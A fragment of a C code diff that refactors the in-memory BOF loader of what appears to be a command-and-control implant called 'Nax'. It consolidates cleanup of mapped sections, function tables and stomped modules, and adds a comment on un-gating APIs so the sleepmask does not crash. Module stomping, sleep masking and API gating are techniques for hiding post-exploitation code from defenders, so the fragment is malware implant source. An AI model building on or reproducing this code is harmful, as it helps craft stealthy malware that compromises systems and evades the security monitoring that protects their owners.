     if ( !entry ) {
-        if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
-        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
-        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
+        NaxBofPrepCleanup( Nax, &prep );
         Nax->BofStompPool.SmStompReq = FALSE;
         return NULL;
     }
 
     Nax->BofStompPool.SmStompReq = FALSE;
 
-    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ )
-        Nax->ResidentSections[i] = mapSections[i];
-    Nax->ResidentNumSections = hdr->NumberOfSections;
-    Nax->ResidentMapFunc     = mf_base;
-    Nax->ResidentStomped     = stomped;
-    Nax->ResidentPdata       = pdataTable;
-    Nax->ResidentPdataCount  = pdataCount;
-    Nax->ResidentPdataInDll  = pdataInDll;
+    for ( UINT16 i = 0; i < prep.Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ )
+        Nax->ResidentSections[i] = prep.MapSections[i];
+    Nax->ResidentNumSections = prep.Hdr->NumberOfSections;
+    Nax->ResidentMapFunc     = prep.MfBase;
+    Nax->ResidentStomped     = prep.Stomped;
+    Nax->ResidentPdata       = prep.PdataTable;
+    Nax->ResidentPdataCount  = prep.PdataCount;
+    Nax->ResidentPdataInDll  = prep.PdataInDll;
 
-    NaxDbg( Nax, "[bof-resident] loaded '%s' at %p (stomped=%d sm_slot=%d)",
-            sym_name, entry, (INT)stomped, (INT)(stomped && Nax->BofStompPool.SmSlot.InUse) );
+    NaxDbg( Nax, "[bof-resident] loaded '%s' at %p (stomped=%d)", sym_name, entry, (INT)prep.Stomped );
     return entry;
 }
 
@@ -678,6 +643,11 @@ FUNC VOID NaxBofFreeResident( PNAX_INSTANCE Nax ) {
 
     NaxDbg( Nax, "[bof-resident] freeing" );
 
+    /* Un-gate APIs BEFORE cleanup - NaxBofStompFree calls VirtualProtect
+       on the SmSlot .text where the sleepmask code lives.  If VP is gated
+       the sleepmask would VirtualProtect its own page to RW, removing
+       execute permission, then DEP-crash on the next instruction.
+       NaxSleepmaskWire re-gates them when a new BOF is loaded. */
     NaxGateUnwireAll( Nax );
 
     /* Route cleanup to SmSlot if the resident was stomped there */
